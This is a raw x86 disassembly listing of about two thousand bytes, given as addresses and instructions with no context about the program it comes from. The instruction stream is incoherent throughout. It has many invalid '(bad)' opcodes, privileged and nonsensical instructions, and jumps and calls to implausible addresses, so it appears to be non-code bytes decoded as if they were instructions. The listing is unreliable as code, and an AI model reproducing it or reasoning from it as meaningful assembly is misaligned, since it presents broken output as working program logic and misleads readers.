  432316:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43231a:	pop    ebp
  43231b:	or     al,0x4
  43231d:	inc    ecx
  43231e:	push   ebp
  43231f:	(bad)  
  432320:	in     al,dx
  432321:	or     ah,ch
  432323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432324:	xbegin 0xffc8991a
  43232a:	clc    
  43232b:	adc    al,0x45
  43232d:	div    BYTE PTR [edx]
  43232f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432336:	test   DWORD PTR [ebx+0x666300f8],ebx
  43233c:	add    BYTE PTR [ecx+0x66],dh
  43233f:	add    eax,DWORD PTR [ebp+0x52]
  432342:	adc    eax,0xffffffa0
  432345:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43234b:	test   DWORD PTR [eax],eax
  43234d:	clc    
  43234e:	data16 or al,BYTE PTR [ebp+0x45]
  432352:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432359:	rol    BYTE PTR [ebp+0x45],1
  43235c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432362:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432368:	push   ebx
  432369:	add    BYTE PTR [eax+eax*1+0x51],dl
  43236d:	jge    0x4323a2
  43236f:	add    BYTE PTR [esi+0x4],dl
  432372:	jne    0x4323d9
  432374:	mov    edx,0x457200
  432379:	jmp    0x43233d
  43237b:	xor    edi,DWORD PTR [ebx]
  43237d:	pop    edi
  43237e:	cvtdq2ps xmm7,xmm0
  432381:	ret    0x0
  432384:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43238a:	xor    ecx,DWORD PTR [edi]
  43238c:	add    eax,DWORD PTR [ecx+0x3b]
  43238f:	push   ebx
  432390:	rdpmc  
  432392:	out    0x8d,al
  432394:	add    BYTE PTR [eax],cl
  432396:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43239c:	ret    0x450c
  43239f:	sbb    al,0x8b
  4323a1:	cmp    eax,esi
  4323a3:	or     cl,al
  4323a5:	or     al,0xc2
  4323a7:	pop    eax
  4323a8:	inc    ebp
  4323a9:	add    ecx,DWORD PTR [edi]
  4323ab:	add    esi,DWORD PTR [ebp+0x39]
  4323ae:	invd   
  4323b0:	jge    0x4323bc
  4323b2:	mov    eax,0x478ac0
  4323b7:	cli    
  4323b8:	xor    esp,ecx
  4323ba:	mov    ebx,0x5b8ac0
  4323bf:	ret    0x33
  4323c2:	mov    eax,0x833b8b
  4323c7:	sub    BYTE PTR [ebx],al
  4323c9:	inc    ebp
  4323ca:	xor    ax,di
  4323cd:	pushf  
  4323ce:	inc    bh
  4323d0:	mov    esp,esp
  4323d2:	hlt    
  4323d3:	test   DWORD PTR [ebp-0x8],esi
  4323d6:	mov    eax,DWORD PTR [ebp-0x14]
  4323d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323df:	dec    edi
  4323e0:	or     BYTE PTR [eax],al
  4323e2:	jne    0x43236d
  4323e4:	mov    esi,esp
  4323e6:	call   0x77a9afab
  4323eb:	inc    ebp
  4323ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323f8:	add    BYTE PTR [esi+0x7d],ah
  4323fb:	inc    ebp
  4323fc:	mov    bx,WORD PTR [ebp+0x8]
  432400:	add    DWORD PTR [ebp+0x54],0x30c008b
  432407:	inc    ebp
  432408:	mov    bx,di
  43240b:	lock test BYTE PTR [ecx+0x7000801],bh
  432412:	jge    0x4323d5
  432414:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43241a:	cli    
  43241b:	xor    bl,bh
  43241d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432423:	test   BYTE PTR [eax],cl
  432425:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43242c:	cmp    ebp,eax
  43242e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432435:	test   BYTE PTR [ebp+0x1],bh
  432438:	mov    ebx,0x458a00
  43243d:	xor    esi,DWORD PTR [ebx]
  43243f:	add    esp,DWORD PTR [esi-0x77]
  432442:	pop    ebp
  432443:	loopne 0x4324ab
  432445:	inc    ebp
  432446:	clc    
  432447:	xor    edi,DWORD PTR [ebx]
  432449:	add    esi,DWORD PTR [edx-0x77]
  43244c:	data16 fdivr QWORD PTR [ebp-0x49]
  432450:	mov    ebx,0xb78afc
  432455:	hlt    
  432456:	xor    edi,DWORD PTR [esi+eiz*2]
  432459:	add    BYTE PTR [ebp+0x66],bl
  43245c:	data16 lock clc 
  43245f:	cmp    al,0x3b
  432461:	add    BYTE PTR [edi+0x66],dh
  432464:	psubq  mm7,QWORD PTR [ebp+0x2]
  432468:	ltr    WORD PTR [ebp+0x66]
  43246c:	add    esi,eax
  43246e:	add    di,WORD PTR [ebp+0x2b]
  432472:	data16 data16 jge 0x4324f3
  432476:	mov    ebx,0xe08a8b
  43247b:	jge    0x4324b0
  43247d:	data16 data16 xor al,0x5d
  432481:	data16 data16 jne 0x43247d
  432485:	mov    edi,DWORD PTR [ebx]
  432487:	fdiv   QWORD PTR [edx+0x7d]
  43248a:	data16 data16 jge 0x4324c2
  43248e:	mov    ebx,0x758a66
  432493:	mov    esi,0x667233
  432498:	pop    ebp
  432499:	or     BYTE PTR [esi+0x0],ah
  43249c:	clc    
  43249d:	mov    edi,DWORD PTR [ebx]
  43249f:	lock ja 0x43242d
  4324a2:	(bad)  
  4324a4:	jge    0x43249d
  4324a6:	invd   
  4324a8:	pop    ebp
  4324a9:	add    BYTE PTR [ebx],al
  4324ab:	(bad)  
  4324ac:	cmp    di,WORD PTR [ebp+0xf]
  4324b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324b4:	mov    bx,WORD PTR [ebp-0x10]
  4324b8:	pop    bp
  4324ba:	fbstp  TBYTE PTR [ebx]
  4324bc:	test   DWORD PTR [ebx],eax
  4324be:	add    BYTE PTR [ebx],bh
  4324c0:	add    BYTE PTR [esi+0x7d],ah
  4324c3:	jge    0x432450
  4324c5:	data16 in al,dx
  4324c7:	pop    ebp
  4324c8:	stc    
  4324c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324d0:	mov    edi,ebx
  4324d2:	in     al,dx
  4324d3:	test   BYTE PTR [ebp+0x0],bh
  4324d6:	mov    eax,DWORD PTR [eax]
  4324d8:	call   0xbd401e68
  4324dd:	cmp    al,0x9b
  4324df:	add    BYTE PTR [edx],dh
  4324e1:	mov    bx,di
  4324e4:	call   0x8b4ba274
  4324e9:	add    ebp,esp
  4324eb:	mov    bx,di
  4324ee:	jnp    0x432516
  4324f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324f6:	mov    eax,DWORD PTR [eax]
  4324f8:	call   0x7c3eb063
  4324fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432503:	data16 data16 fistp WORD PTR [ebp+0xe]
  432508:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432512:	fisttp WORD PTR [ecx-0x7401f77b]
  432518:	(bad)  
  432519:	cld    
  43251a:	jne    0x432558
  43251c:	xor    eax,DWORD PTR [eax]
  43251e:	mov    esp,DWORD PTR [esi-0x10]
  432521:	sti    
  432522:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432529:	data16 adc bl,bh
  43252c:	push   ebp
  43252d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432534:	mov    WORD PTR [eax],es
  432536:	fwait
  432537:	data16 xor bh,bl
  43253a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432540:	mov    esp,DWORD PTR [esi-0x14]
  432543:	fisttp WORD PTR [ebx-0x3748a9f2]
  432549:	or     al,0x2b
  43254b:	mov    bh,0xba
  43254d:	hlt    
  43254e:	mov    bh,bl
  432550:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432556:	dec    esi
  432557:	or     al,0x0
  432559:	mov    edi,DWORD PTR [ebx]
  43255b:	or     BYTE PTR [ebp+0x3b],dh
  43255e:	mov    ecx,DWORD PTR [edi]
  432560:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432566:	xor    al,0xd8
  432568:	pop    bp
  43256a:	lock xor esi,DWORD PTR [ebx]
  43256d:	lea    esp,[esi+0x1f]
  432570:	icebp  
  432571:	jb     0x432577
  432573:	add    al,al
  432575:	jge    0x432583
  432577:	mov    eax,eax
  432579:	fsubr  st,st(3)
  43257b:	pop    ebp
  43257c:	mov    esi,DWORD PTR [ebx]
  43257e:	in     al,0x8d
  432580:	rcr    DWORD PTR [edi],0xc2
  432583:	jb     0x4325e3
  432585:	add    cl,cl
  432587:	jge    0x432595
  432589:	mov    edx,DWORD PTR [ebp-0x20]
  43258c:	in     al,dx
  43258d:	pop    ebp
  43258e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432593:	cmp    di,WORD PTR [ebp+0x0]
  432597:	mov    ebp,DWORD PTR [ebx]
  432599:	fdivr  QWORD PTR [esi+0x668a5d]
  43259f:	cmp    al,0x33
  4325a1:	mov    si,0x4e7d
  4325a5:	mov    eax,DWORD PTR [eax]
  4325a7:	lock inc ebp
  4325a9:	mov    esi,DWORD PTR [eax]
  4325ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325b2:	clc    
  4325b3:	(bad)  
  4325b4:	cmp    edi,DWORD PTR [ebx]
  4325b6:	je     0x4325c7
  4325b8:	push   ebx
  4325b9:	loopne 0x4325ca
  4325bb:	dec    ecx
  4325bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4325c0:	int    0xf1
  4325c2:	mov    esi,0x703084d
  4325c7:	pcmpgtd mm6,mm1
  4325ca:	add    BYTE PTR [ebp+0x66],dh
  4325cd:	jmp    0x43259a
  4325cf:	mov    eax,DWORD PTR [ebx]
  4325d1:	lock push ebp
  4325d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325d9:	or     bh,dl
  4325db:	jb     0x4325db
  4325dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325e3:	loopne 0x4325e5
  4325e5:	jne    0x4325e9
  4325e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4325eb:	mov    ecx,ebx
  4325ed:	data16 cmp al,0xf1
  4325f0:	add    BYTE PTR [esi+eiz*2],bh
  4325f3:	add    bl,cl
  4325f5:	retw   0xf2
  4325f9:	ret    0x66
  4325fc:	retf   
  4325fd:	enterw 0x4df1,0x19
  432602:	pop    edi
  432603:	jne    0x432586
  432605:	mov    esi,DWORD PTR [eax]
  432607:	call   0x77b7b1a8
  43260c:	xor    ebp,DWORD PTR [ebx]
  43260e:	lea    esp,[esi+0x48]
  432611:	repnz in eax,0x3b
  432614:	add    BYTE PTR [ebp-0x37],dh
  432617:	xor    edx,DWORD PTR [ebp-0x15]
  43261a:	in     al,dx
  43261b:	xor    edx,DWORD PTR [esi+0x40]
  43261e:	mov    DWORD PTR [edi],0x338545fc
  432624:	clc    
  432625:	add    esi,DWORD PTR [ecx]
  432627:	pop    edi
  432628:	pushf  
  432629:	pop    ebx
  43262a:	call   0xff4425f1
  43262f:	mov    edi,eax
  432631:	push   ecx
  432632:	pop    es
  432633:	mov    edi,DWORD PTR [eax]
  432635:	push   esi
  432636:	inc    esi
  432637:	add    bh,BYTE PTR [esi+0x0]
  43263a:	popa   
  43263b:	data16 (bad) 
  43263d:	into   
  43263e:	gs cmp al,0xcd
  432641:	add    BYTE PTR [ecx+0x7ce0866],bh
  432647:	ret    0x66
  43264a:	add    bh,al
  43264c:	add    bh,ah
  43264e:	add    BYTE PTR [ebp+0x31c3f866],al
  432654:	cmp    al,0x9c
  432656:	add    BYTE PTR [esi+0x66],ah
  432659:	into   
  43265a:	ret    
  43265b:	pop    ebp
  43265c:	adc    BYTE PTR [edi+0x0],dl
  43265f:	mov    bh,0x66
  432661:	mov    edi,0xff038dc3
  432666:	jne    0x4326bc
  432668:	lea    edx,[ecx+0x1]
  43266b:	mov    ebx,0xd64ff1
  432670:	sar    DWORD PTR [ebx],1
  432672:	test   BYTE PTR [ebp+0x36],dh
  432675:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432679:	push   edi
  43267a:	xor    BYTE PTR [ebx],0x38
  43267d:	mov    esi,ebx
  43267f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432685:	ss inc ebp
  432687:	fs pop ebx
  432689:	mov    ebx,0x9c3b30
  43268e:	je     0x4326bb
  432690:	xor    edi,DWORD PTR [ebx+0x668a33]
  432696:	mov    WORD PTR [ebx],?
  432698:	ss mov ebx,0x8b4e64
  43269e:	pop    edi
  43269f:	cmp    ecx,ecx
  4326a1:	jne    0x4326f8
  4326a3:	mov    ebp,esp
  4326a5:	cld    
  4326a6:	push   esi
  4326a7:	pop    ebx
  4326a8:	inc    ebp
  4326a9:	stc    
  4326aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4326b0:	test   esi,ecx
  4326b2:	clc    
  4326b3:	test   dl,dl
  4326b5:	cmp    bh,bh
  4326b7:	fs pop si
  4326ba:	or     bl,al
  4326bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4326c2:	retf   0x3c45
  4326c5:	xor    BYTE PTR [eax],al
  4326c7:	pushf  
  4326c8:	mov    si,0x85ca
  4326cc:	ret    0xf8
  4326cf:	pop    ebx
  4326d0:	dec    dx
  4326d3:	mov    edx,DWORD PTR [edi-0x76]
  4326d6:	push   edi
  4326d7:	add    al,0xb7
  4326d9:	xor    al,0xba
  4326db:	cmp    al,0x8d
  4326dd:	je     0x4326de
  4326df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326e3:	lea    edi,[ebx+0x544fff]
  4326e9:	push   ecx
  4326ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4326ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326f3:	add    BYTE PTR [ebx],dh
  4326f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432702:	mov    ebx,0x3b3b00
  432707:	jne    0x432734
  432709:	mov    DWORD PTR [ebx+0x728afc],edi
  43270f:	xor    esi,DWORD PTR [ebx]
  432711:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432717:	push   edi
  432718:	cmp    esp,ebp
  43271a:	jne    0x43271c
  43271c:	sbb    DWORD PTR [eax],0x8085c3fc
  432722:	clc    
  432723:	inc    esi
  432724:	pop    ebx
  432725:	sti    
  432726:	add    eax,0xeb8bc075
  43272b:	cld    
  43272c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432732:	mov    ecx,DWORD PTR [ecx+edx*2]
  432735:	rol    DWORD PTR [ebp-0x37],0xf
  432739:	mov    DWORD PTR [eax],ecx
  43273b:	inc    edi
  43273c:	(bad)  
  43273d:	in     eax,0xfe
  43273f:	add    bh,bh
  432741:	(bad)  
  432742:	mov    esi,0xc38a5e
  432747:	mov    esi,DWORD PTR [ebx]
  432749:	push   ecx
  43274a:	mov    edi,0xfc4ec7
  43274f:	test   DWORD PTR [ebp-0x8],edx
  432752:	xor    di,ax
  432755:	pushf  
  432756:	sub    ebp,eax
  432758:	inc    ebp
  432759:	(bad)  
  43275a:	sub    edi,edi
  43275c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432762:	inc    ebp
  432763:	add    BYTE PTR [esi+0x2b],ah
  432766:	or     bh,BYTE PTR [edx+0xf8ac2]
  43276c:	cmp    al,0x33
  43276e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432774:	(bad)  
  432775:	cmp    esi,DWORD PTR [ebx]
  432777:	je     0x432731
  432779:	push   ebx
  43277a:	dec    esi
  43277b:	str    ecx
  43277e:	cmp    esp,DWORD PTR [ebp+0x75]
  432781:	int    0x33
  432783:	mov    edi,0x789085f
  432788:	mov    edx,DWORD PTR [eax]
  43278a:	cld    
  43278b:	add    cl,cl
  43278d:	data16 add al,0xcb
  432790:	push   ebp
  432791:	add    ebp,esp
  432793:	jne    0x432781
  432795:	(bad)  
  432796:	mov    DWORD PTR [ecx],0xd685f7ec
  43279c:	clc    
  43279d:	xlat   BYTE PTR ds:[ebx]
  43279e:	inc    ebp
  43279f:	mov    esi,DWORD PTR [edx]
  4327a1:	push   eax
  4327a2:	pushf  
  4327a3:	in     eax,0x8b
  4327a5:	add    ah,ch
  4327a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4327ab:	add    ax,0x72cb
  4327af:	cmp    al,0x0
  4327b1:	add    BYTE PTR [ebp+0x66],al
  4327b4:	(bad)  
  4327b5:	retf   
  4327b6:	lock ret 0x85
  4327ba:	clc    
  4327bb:	inc    bp
  4327bd:	retf   
  4327be:	cmp    eax,0xc77d9cc8
  4327c3:	xor    ah,bh
  4327c5:	pushf  
  4327c6:	test   DWORD PTR [edi-0x8],ebx
  4327c9:	je     0x432810
  4327cb:	xor    esi,DWORD PTR ds:0x7020840
  4327d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4327d5:	push   ebp
  4327d6:	add    esp,ebp
  4327d8:	jb     0x432765
  4327da:	add    BYTE PTR [eax],cl
  4327dc:	dec    ebp
  4327dd:	mov    bh,0x81
  4327df:	push   esi
  4327e0:	push   esp
  4327e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327e8:	xor    al,BYTE PTR [eax]
  4327ea:	mov    edx,DWORD PTR [edi+0x10]
  4327ed:	(bad)  
  4327ee:	scas   eax,DWORD PTR es:[edi]
  4327ef:	ret    0x3b
  4327f2:	jns    0x3b4424e5
  4327f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327fc:	dec    ebp
  4327fd:	or     BYTE PTR [ebx],ch
  4327ff:	ret    0x458b
  432802:	lock jmp 0x4327f6
  432805:	mov    ecx,DWORD PTR [eax]
  432807:	or     BYTE PTR [edi],al
  432809:	mov    ecx,eax
  43280b:	xor    DWORD PTR [edx+0x2],0x0
  43280f:	mov    bh,0xc1
  432811:	adc    BYTE PTR [eax],dh
  432813:	iret   
  432814:	inc    ebp
  432815:	mov    DWORD PTR [ebx],0x4dfff8c4
  43281b:	inc    BYTE PTR [ebx]
  43281d:	ret    0xf8
  432820:	adc    DWORD PTR [esi+0x10],esp
  432823:	clc    
  432824:	dec    ecx
  432825:	fisttp WORD PTR [ecx+0x456604c0]
  43282b:	add    dh,BYTE PTR ds:0x75e0845
  432831:	ret    0x4d
  432834:	lea    ecx,[ebx+0x18728301]
  43283a:	add    BYTE PTR [ebp+0x45],al
  43283d:	xor    ecx,ebp
  43283f:	pushf  
  432840:	add    bh,al
  432842:	add    al,ch
  432844:	inc    ebp
  432845:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43284b:	xor    eax,0x781084d
  432850:	push   esp
  432851:	fwait
  432852:	push   ecx
  432853:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432859:	inc    ebp
  43285a:	cmp    edi,DWORD PTR [ecx]
  43285c:	jbe    0x4327fa
  43285e:	mov    eax,edi
  432860:	or     ah,dh
  432862:	inc    ebp
  432863:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432869:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43286f:	in     al,dx
  432870:	hlt    
  432871:	push   esp
  432872:	push   esp
  432873:	push   ecx
  432874:	push   ecx
  432875:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43287b:	fwait
  43287c:	fwait
  43287d:	xor    dh,BYTE PTR [edx]
  43287f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432885:	or     BYTE PTR [ebp+0x7],al
  432888:	mov    eax,ecx
  43288a:	clc    
  43288b:	jb     0x43284e
  43288d:	add    BYTE PTR [ebp+0x55],cl
  432890:	or     DWORD PTR [edi],0xc251d154
  432896:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4328a0:	mov    edi,eax
  4328a2:	or     cl,al
  4328a4:	inc    ebp
  4328a5:	dec    ebp
  4328a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4328ac:	or     WORD PTR [ecx],0x899b
  4328b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328b7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ba:	mov    eax,DWORD PTR [ebp-0x8]
  4328bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328ca:	inc    ebp
  4328cb:	dec    eax
  4328cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328d2:	add    edx,DWORD PTR [ecx-0x8]
  4328d5:	mov    ecx,DWORD PTR [ecx]
  4328d7:	clc    
  4328d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328df:	mov    ecx,ebp
  4328e1:	clc    
  4328e2:	(bad)  
  4328e3:	popf   
  4328e4:	inc    DWORD PTR [eax]
  4328e6:	ret    0x8b
  4328e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328ef:	mov    edi,esp
  4328f1:	hlt    
  4328f2:	test   ecx,esi
  4328f4:	clc    
  4328f5:	or     BYTE PTR [ebp+0x7],al
  4328f8:	xor    al,cl
  4328fa:	pushf  
  4328fb:	jb     0x432930
  4328fd:	add    BYTE PTR [eax-0x3f],al
  432900:	inc    eax
  432901:	daa    
  432902:	inc    ebp
  432903:	inc    ebp
  432904:	xor    eax,0x7f80803
  432909:	dec    ebp
  43290a:	fwait
  43290b:	add    esi,DWORD PTR [edx]
  43290d:	clc    
  43290e:	cmp    DWORD PTR [ecx],ecx
  432910:	or     al,0x8
  432912:	add    al,BYTE PTR [ebp+0x2c]
  432915:	xor    eax,0x7350845
  43291a:	or     BYTE PTR [ebp+0x7],cl
  43291d:	lea    ebx,[ebx-0x748dcdff]
  432923:	add    BYTE PTR [eax*2-0x74b21438],cl
  43292a:	mov    edx,DWORD PTR [eax]
  43292c:	cld    
  43292d:	dec    ebp
  43292e:	push   esp
  43292f:	sub    edx,DWORD PTR [ecx-0x75]
  432932:	add    eax,0xf172fc
  432937:	or     BYTE PTR [ebp+0x7],cl
  43293a:	add    eax,ecx
  43293c:	or     al,0x72
  43293e:	add    DWORD PTR [eax],eax
  432940:	mov    ebx,0x29c2c1
  432945:	inc    ebp
  432946:	mov    eax,DWORD PTR [ebx]
  432948:	cmp    eax,0x3004d1c
  43294e:	xbegin 0x66c8b548
  432954:	clc    
  432955:	or     BYTE PTR [ebp+0x45],al
  432958:	xor    dh,BYTE PTR ds:0x78b089c
  43295e:	adc    BYTE PTR [ebp+0x45],cl
  432961:	lea    eax,[ebp+0x33727501]
  432967:	add    cl,ch
  432969:	inc    ebp
  43296a:	add    bl,ch
  43296c:	add    BYTE PTR [ebx+0x45850845],cl
  432972:	je     0x4328ff
  432974:	push   ebx
  432975:	or     al,0x85
  432977:	dec    ebp
  432978:	std    
  432979:	mov    bh,bh
  43297b:	mov    BYTE PTR [ebp-0x75],al
  43297e:	mov    edi,eax
  432980:	or     al,0x89
  432982:	inc    ebp
  432983:	clc    
  432984:	mov    esp,esp
  432986:	hlt    
  432987:	call   DWORD PTR [edi-0x37]
  43298a:	push   esp
  43298b:	or     al,0x51
  43298d:	push   ebp
  43298e:	xor    ebp,esp
  432990:	mov    esi,0x457251
  432995:	xor    esi,eax
  432997:	pushf  
  432998:	inc    ebp
  432999:	(bad)  
  43299a:	mov    edi,eax
  43299c:	or     al,0x85
  43299e:	add    al,bh
  4329a0:	inc    eax
  4329a2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329a6:	or     ah,bh
  4329a8:	inc    eax
  4329a9:	push   esp
  4329aa:	jmp    0x4329fd
  4329ac:	mov    eax,DWORD PTR ds:0xe8720c
  4329b2:	mov    DWORD PTR [ebp-0x8],eax
  4329b5:	jne    0x4329fc
  4329b7:	jmp    0x432944
  4329b9:	mov    ebp,DWORD PTR [eax]
  4329bb:	clc    
  4329bc:	retf   0xff54
  4329bf:	push   ecx
  4329c0:	mov    DWORD PTR ds:0x757210,eax
  4329c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329c9:	sub    esp,DWORD PTR [ebx-0x77]
  4329cc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329d3:	or     ah,bh
  4329d5:	pop    es
  4329d6:	ds fwait
  4329d8:	push   DWORD PTR [edx]
  4329da:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329e0:	(bad)  
  4329e1:	mov    bh,bh
  4329e3:	jmp    0x4329d1
  4329e5:	leave  
  4329e6:	jne    0x4329f0
  4329e8:	call   0x302342
  4329ed:	in     al,dx
  4329ee:	dec    ebp
  4329ef:	add    dh,BYTE PTR [ebx]
  4329f1:	add    BYTE PTR [ebx],al
  4329f3:	inc    ebp
  4329f4:	cmp    esi,DWORD PTR [ecx]
  4329f6:	je     0x432994
  4329f8:	mov    eax,edi
  4329fa:	or     al,0xf0
  4329fc:	add    BYTE PTR [ebp+0x458bf845],al
  432a02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a08:	adc    al,0x7
  432a0a:	enter  0x9fc0,0xa5
  432a0e:	rol    BYTE PTR [eax],0x5e
  432a11:	mov    ecx,ecx
  432a13:	or     al,0xc
  432a15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a1c:	jmp    0x432a1d
  432a1e:	push   ebp
  432a1f:	mov    esp,ebp
  432a21:	cld    
  432a22:	inc    ebp
  432a23:	inc    ebp
  432a24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a2b:	push   esi
  432a2c:	push   esi
  432a2d:	mov    edi,0x7af080f
  432a32:	add    bh,al
  432a34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a40:	mov    ebp,eax
  432a42:	mov    ebp,edi
  432a44:	lock call edx
  432a47:	fcom   DWORD PTR [ebp+0x45]
  432a4a:	mov    eax,0x148a8b
  432a4f:	push   ecx
  432a50:	enter  0xc145,0x83
  432a54:	cmp    ecx,DWORD PTR [eax]
  432a56:	add    BYTE PTR [ebp+0x4d],al
  432a59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a5f:	call   0xffa325ce
  432a64:	cmp    eax,DWORD PTR [ebp-0xc]
  432a67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a6b:	push   ebp
  432a6c:	(bad)  
  432a6d:	call   0x342871
  432a72:	mov    bh,0xdb
  432a74:	cld    
  432a75:	or     BYTE PTR [ebp+0x45],bl
  432a78:	(bad)  
  432a79:	call   0xff7d2709
  432a7e:	add    al,BYTE PTR [ebp+0x37]
  432a81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a87:	jne    0x432a89
  432a89:	(bad)  
  432a8a:	cmp    edi,esp
  432a8c:	jne    0x432abf
  432a8e:	mov    edi,edi
  432a90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a96:	pop    ds
  432a97:	into   
  432a98:	je     0x432a5b
  432a9a:	mov    ebx,DWORD PTR [esi]
  432a9c:	or     BYTE PTR [ebp-0x49],al
  432a9f:	mov    esp,DWORD PTR [esi-0x77]
  432aa2:	mov    esi,0x2451f0c
  432aa7:	mov    eax,DWORD PTR [eax]
  432aa9:	or     al,0x66
  432aab:	sar    bl,0x3b
  432aae:	xor    esi,DWORD PTR [ebp+0x66]
  432ab1:	xor    ecx,edi
  432ab3:	pop    edi
  432ab4:	adc    bl,BYTE PTR [ebx+0x7e]
  432ab7:	ret    0xff
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432ac2:	cld    
  432ac3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432aca:	push   0xffffff83
  432acc:	pop    edi
  432acd:	or     BYTE PTR [ebp+0x53],dh
  432ad0:	xorps  xmm1,xmm2
  432ad3:	test   BYTE PTR [eax+eax*1],bh
  432ad6:	add    BYTE PTR [eax],al
  432ad8:	adc    eax,eax
  432ada:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ae2:	jmp    DWORD PTR [eax]
  432ae4:	ror    al,0x5e
  432ae7:	inc    ebp
  432ae8:	leave  
  432ae9:	xor    ecx,DWORD PTR [eax]
  432aeb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432af1:	add    ah,al
  432af3:	xor    edi,edi
  432af5:	xor    DWORD PTR [ebx],0x66003302
  432afb:	mov    DWORD PTR [ebp-0xc],ecx
  432afe:	pcmpgtw mm0,mm0
  432b01:	add    dl,ah
  432b03:	leave  
  432b04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b08:	push   eax
  432b09:	dec    ebp
  432b0a:	mov    esi,DWORD PTR [ebx-0x75]
  432b0d:	lea    ebp,[eax-0x7c00ff02]
  432b13:	xor    eax,DWORD PTR [eax]
  432b15:	sysret 
  432b17:	dec    ebp
  432b18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b1f:	push   WORD PTR [ecx+0x8]
  432b23:	jne    0x432ae6
  432b25:	ud0    ecx,DWORD PTR [ecx]
  432b28:	mov    eax,edx
  432b2a:	lods   al,BYTE PTR ds:[esi]
  432b2b:	add    BYTE PTR [eax],al
  432b2d:	data16 (bad) 
  432b2f:	iret   
  432b30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b37:	cli    
  432b38:	inc    ebp
  432b39:	cmp    al,0x8d
  432b3b:	add    BYTE PTR [esi+0x2d],ah
  432b3e:	inc    ebp
  432b3f:	pop    ebp
  432b40:	lea    ecx,[edi]
  432b42:	mov    dl,bh
  432b44:	add    BYTE PTR [edi],cl
  432b46:	mov    DWORD PTR [eax+eax*8],edi
  432b49:	mov    ebx,0x3b87
